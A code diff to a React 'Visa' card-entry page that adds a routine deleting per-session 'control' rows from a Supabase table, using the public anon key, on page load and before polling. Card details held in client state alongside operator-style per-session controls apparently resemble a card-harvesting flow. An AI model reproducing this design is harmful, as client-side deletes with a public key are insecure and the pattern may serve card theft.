@@ -16,7 +16,6 @@ type WaitState = "idle" | "waiting" | "error";
 export default function Visa() {
   const [, setLocation] = useLocation();
   
-
   const [cardNumber, setCardNumber] = useState("");
   const [cardHolder, setCardHolder] = useState("");
   const [expiry, setExpiry] = useState("");
@@ -29,11 +28,38 @@ export default function Visa() {
   const [basePrice, setBasePrice] = useState(0);
   const [company, setCompany] = useState("");
 
+  // Clear any old control from Supabase when entering this page
+  const clearOldControl = async (sessionId: string) => {
+    const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
+    const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
+    
+    if (!supabaseUrl || !supabaseKey) return;
+    
+    try {
+      await fetch(`${supabaseUrl}/rest/v1/controls?session_id=eq.${sessionId}`, {
+        method: 'DELETE',
+        headers: {
+          'apikey': supabaseKey,
+          'Authorization': `Bearer ${supabaseKey}`,
+        },
+      });
+      console.log("Cleared old control for session:", sessionId);
+    } catch (error) {
+      console.error("Failed to clear old control:", error);
+    }
+  };
+
   useEffect(() => {
     const priceStr = localStorage.getItem("selectedPrice");
     const comp = localStorage.getItem("selectedCompany");
     if (priceStr) setBasePrice(parseFloat(priceStr));
     if (comp) setCompany(comp);
+    
+    // Clear old controls when entering page
+    const sessionId = localStorage.getItem("sessionId");
+    if (sessionId) {
+      void clearOldControl(sessionId);
+    }
   }, []);
 
   useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current); }, []);
@@ -46,6 +72,10 @@ export default function Visa() {
   const startPolling = (sessionId: string) => {
     if (pollRef.current) clearInterval(pollRef.current);
     let lastSeen = Math.max(...getSubmissions().map(s => s.id), 0);
+    
+    // Immediately clear any existing control from Supabase before starting
+    void clearOldControl(sessionId);
+    
     pollRef.current = window.setInterval(async () => {
       try {
         const subs = getSubmissions().filter(s => s.sessionId === sessionId && s.id > lastSeen);
